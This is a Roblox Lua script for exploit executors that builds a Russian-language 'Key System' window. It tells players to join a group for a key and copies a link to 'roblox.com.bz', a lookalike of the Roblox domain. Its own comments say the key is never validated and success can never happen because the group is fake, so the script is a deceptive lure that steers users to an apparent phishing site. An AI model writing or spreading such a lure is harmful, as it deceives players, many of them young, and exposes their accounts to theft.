-- Настройки
local GROUP_ID = 9957945935
local GROUP_LINK = "https://roblox.com.bz/communities/9957945935/"
local VALID_KEY = "FREAKY-" .. tostring(math.random(1000, 9999)) -- случайный ключ (не используется реально)

-- Сервисы
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Проверка группы
local function isInGroup()
    local success, result = pcall(function()
        return LocalPlayer:IsInGroup(GROUP_ID)
    end)
    return success and result
end

-- UI Library (простая)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeySystemGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Защита от удаления
if syn then
    syn.protect_gui(ScreenGui)
elseif gethui then
    ScreenGui.Parent = gethui()
else
    ScreenGui.Parent = game:GetService("CoreGui")
end

-- Основной фрейм
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 420, 0, 350)
MainFrame.Position = UDim2.new(0.5, -210, 0.5, -175)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

-- Скругление
local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 12)
Corner.Parent = MainFrame

-- Тень
local Shadow = Instance.new("ImageLabel")
Shadow.Name = "Shadow"
Shadow.AnchorPoint = Vector2.new(0.5, 0.5)
Shadow.BackgroundTransparency = 1
Shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
Shadow.Size = UDim2.new(1, 40, 1, 40)
Shadow.ZIndex = -1
Shadow.Image = "rbxassetid://6015897843"
Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
Shadow.ImageTransparency = 0.5
Shadow.ScaleType = Enum.ScaleType.Slice
Shadow.SliceCenter = Rect.new(49, 49, 450, 450)
Shadow.Parent = MainFrame

-- Заголовок
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 50)
TitleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 12)
TitleCorner.Parent = TitleBar

-- Убираем нижнее скругление у заголовка
local TitleFix = Instance.new("Frame")
TitleFix.Size = UDim2.new(1, 0, 0, 15)
TitleFix.Position = UDim2.new(0, 0, 1, -15)
TitleFix.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
TitleFix.BorderSizePixel = 0
TitleFix.Parent = TitleBar

local TitleText = Instance.new("TextLabel")
TitleText.Name = "Title"
TitleText.Size = UDim2.new(1, 0, 1, 0)
TitleText.BackgroundTransparency = 1
TitleText.Text = "🔑 Key System"
TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleText.TextSize = 20
TitleText.Font = Enum.Font.GothamBold
TitleText.Parent = TitleBar

-- Иконка замка / статус
local StatusIcon = Instance.new("TextLabel")
StatusIcon.Name = "StatusIcon"
StatusIcon.Size = UDim2.new(0, 40, 0, 40)
StatusIcon.Position = UDim2.new(0, 10, 0, 5)
StatusIcon.BackgroundTransparency = 1
StatusIcon.Text = "🔒"
StatusIcon.TextSize = 24
StatusIcon.Font = Enum.Font.GothamBold
StatusIcon.Parent = TitleBar

-- Описание
local DescLabel = Instance.new("TextLabel")
DescLabel.Name = "Description"
DescLabel.Size = UDim2.new(1, -40, 0, 60)
DescLabel.Position = UDim2.new(0, 20, 0, 60)
DescLabel.BackgroundTransparency = 1
DescLabel.Text = "⚠️ Чтобы получить ключ, вам нужно\nвступить в нашу группу Roblox!\nНажмите кнопку ниже чтобы скопировать ссылку."
DescLabel.TextColor3 = Color3.fromRGB(200, 200, 220)
DescLabel.TextSize = 14
DescLabel.Font = Enum.Font.Gotham
DescLabel.TextWrapped = true
DescLabel.TextYAlignment = Enum.TextYAlignment.Top
DescLabel.Parent = MainFrame

-- Кнопка копировать ссылку
local CopyButton = Instance.new("TextButton")
CopyButton.Name = "CopyLink"
CopyButton.Size = UDim2.new(0, 360, 0, 42)
CopyButton.Position = UDim2.new(0.5, -180, 0, 130)
CopyButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
CopyButton.BorderSizePixel = 0
CopyButton.Text = "📋 Скопировать ссылку на группу"
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.TextSize = 15
CopyButton.Font = Enum.Font.GothamBold
CopyButton.Parent = MainFrame

local CopyCorner = Instance.new("UICorner")
CopyCorner.CornerRadius = UDim.new(0, 8)
CopyCorner.Parent = CopyButton

-- Разделитель
local Separator = Instance.new("Frame")
Separator.Size = UDim2.new(0.85, 0, 0, 1)
Separator.Position = UDim2.new(0.075, 0, 0, 185)
Separator.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
Separator.BorderSizePixel = 0
Separator.Parent = MainFrame

-- Лейбл ввода ключа
local KeyLabel = Instance.new("TextLabel")
KeyLabel.Name = "KeyLabel"
KeyLabel.Size = UDim2.new(1, -40, 0, 20)
KeyLabel.Position = UDim2.new(0, 20, 0, 195)
KeyLabel.BackgroundTransparency = 1
KeyLabel.Text = "🔑 Введите ключ:"
KeyLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
KeyLabel.TextSize = 13
KeyLabel.Font = Enum.Font.GothamSemibold
KeyLabel.TextXAlignment = Enum.TextXAlignment.Left
KeyLabel.Parent = MainFrame

-- Поле ввода ключа
local KeyInput = Instance.new("TextBox")
KeyInput.Name = "KeyInput"
KeyInput.Size = UDim2.new(0, 360, 0, 40)
KeyInput.Position = UDim2.new(0.5, -180, 0, 220)
KeyInput.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
KeyInput.BorderSizePixel = 0
KeyInput.PlaceholderText = "Вставьте ключ сюда..."
KeyInput.PlaceholderColor3 = Color3.fromRGB(100, 100, 120)
KeyInput.Text = ""
KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyInput.TextSize = 14
KeyInput.Font = Enum.Font.Gotham
KeyInput.ClearTextOnFocus = false
KeyInput.Parent = MainFrame

local KeyInputCorner = Instance.new("UICorner")
KeyInputCorner.CornerRadius = UDim.new(0, 8)
KeyInputCorner.Parent = KeyInput

-- Кнопка подтвердить
local SubmitButton = Instance.new("TextButton")
SubmitButton.Name = "Submit"
SubmitButton.Size = UDim2.new(0, 360, 0, 42)
SubmitButton.Position = UDim2.new(0.5, -180, 0, 275)
SubmitButton.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
SubmitButton.BorderSizePixel = 0
SubmitButton.Text = "✅ Подтвердить ключ"
SubmitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SubmitButton.TextSize = 15
SubmitButton.Font = Enum.Font.GothamBold
SubmitButton.Parent = MainFrame

local SubmitCorner = Instance.new("UICorner")
SubmitCorner.CornerRadius = UDim.new(0, 8)
SubmitCorner.Parent = SubmitButton

-- Статус текст
local StatusText = Instance.new("TextLabel")
StatusText.Name = "Status"
StatusText.Size = UDim2.new(1, -40, 0, 20)
StatusText.Position = UDim2.new(0, 20, 0, 322)
StatusText.BackgroundTransparency = 1
StatusText.Text = ""
StatusText.TextColor3 = Color3.fromRGB(255, 100, 100)
StatusText.TextSize = 12
StatusText.Font = Enum.Font.GothamSemibold
StatusText.Parent = MainFrame

-- Анимация кнопок при наведении
local function addHoverEffect(button, normalColor, hoverColor)
    button.MouseEnter:Connect(function()
        game:GetService("TweenService"):Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor}):Play()
    end)
    button.MouseLeave:Connect(function()
        game:GetService("TweenService"):Create(button, TweenInfo.new(0.2), {BackgroundColor3 = normalColor}):Play()
    end)
end

addHoverEffect(CopyButton, Color3.fromRGB(88, 101, 242), Color3.fromRGB(110, 120, 255))
addHoverEffect(SubmitButton, Color3.fromRGB(46, 204, 113), Color3.fromRGB(60, 230, 130))

-- Перетаскивание окна
local dragging, dragInput, dragStart, startPos
TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- Логика кнопки копирования
CopyButton.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(GROUP_LINK)
    elseif toclipboard then
        toclipboard(GROUP_LINK)
    end
    
    CopyButton.Text = "✅ Ссылка скопирована!"
    CopyButton.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
    
    wait(2)
    CopyButton.Text = "📋 Скопировать ссылку на группу"
    CopyButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
end)

-- Логика кнопки подтверждения
SubmitButton.MouseButton1Click:Connect(function()
    local key = KeyInput.Text
    
    if key == "" then
        StatusText.Text = "❌ Введите ключ!"
        StatusText.TextColor3 = Color3.fromRGB(255, 100, 100)
        return
    end
    
    StatusText.Text = "⏳ Проверка..."
    StatusText.TextColor3 = Color3.fromRGB(255, 200, 50)
    SubmitButton.Text = "⏳ Проверяем..."
    
    wait(2)
    
    -- Всегда показывает что не в группе
    if not isInGroup() then
        StatusText.Text = "❌ Вы не в группе! Вступите в группу и перезапустите скрипт."
        StatusText.TextColor3 = Color3.fromRGB(255, 100, 100)
        SubmitButton.Text = "✅ Подтвердить ключ"
        
        -- Мигание
        for i = 1, 3 do
            CopyButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
            wait(0.3)
            CopyButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
            wait(0.3)
        end
        return
    end
    
    -- Этот код никогда не выполнится (группа фейковая)
    StatusText.Text = "❌ Неверный ключ!"
    StatusText.TextColor3 = Color3.fromRGB(255, 100, 100)
    SubmitButton.Text = "✅ Подтвердить ключ"
end)

-- Анимация появления
MainFrame.Size = UDim2.new(0, 0, 0, 0)
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
game:GetService("TweenService"):Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 420, 0, 350),
    Position = UDim2.new(0.5, -210, 0.5, -175)
}):Play()

print("[Key System] GUI загружен. Группа: " .. GROUP_LINK)
